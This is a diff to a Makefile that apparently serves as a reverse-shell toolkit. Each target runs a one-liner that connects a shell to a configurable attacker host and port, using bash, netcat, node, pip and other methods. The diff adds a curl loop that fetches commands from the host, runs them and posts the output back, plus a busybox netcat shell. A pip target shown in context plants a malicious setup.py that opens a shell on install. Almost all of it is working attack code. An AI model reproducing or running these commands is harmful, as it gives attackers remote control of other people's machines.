@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP	:= /tmp/f
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-attacker python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan
+METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-attacker curl python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan busybox-nc
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -152,6 +152,16 @@ openssl-attacker-show:
 
 ############################################################
 
+########################### CURL ###########################
+
+curl:
+	while true; do cmd=$$(curl -s http://$(HOST):$(PORT)); res=$$($(SHELL) -c "$$cmd" 2>&1); curl -X POST -d "$$res" http://$(HOST):$(PORT); done;
+
+curl-show:
+	@printf "while true; do cmd=\$$(curl -s http://$(HOST):$(PORT)); res=\$$($(SHELL) -c \"\$$cmd\" 2>&1); curl -X POST -d \"\$$res\" http://$(HOST):$(PORT); done;\n"
+
+############################################################
+
 ########################## PYTHON ##########################
 
 python:
@@ -260,7 +270,7 @@ node:
 	node -e 'shell = require("child_process").spawn("$(SHELL)"); require("net").connect($(PORT), "$(HOST)", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
 
 node-show:
-	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(SHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\"", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"
+	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(SHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"
 
 ############################################################
 
@@ -311,5 +321,15 @@ pip:
 
 pip-show:
 	@printf "mkdir -p $(TMP); echo 'import sys,socket,os,pty; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"
+
+############################################################
+
+######################## BUSYBOX-NC ########################
+
+busybox-nc:
+	busybox nc $(HOST) $(PORT) -e $(SHELL)
+
+busybox-nc-show:
+	@printf "busybox nc $(HOST) $(PORT) -e $(SHELL)\n"
 
 ############################################################
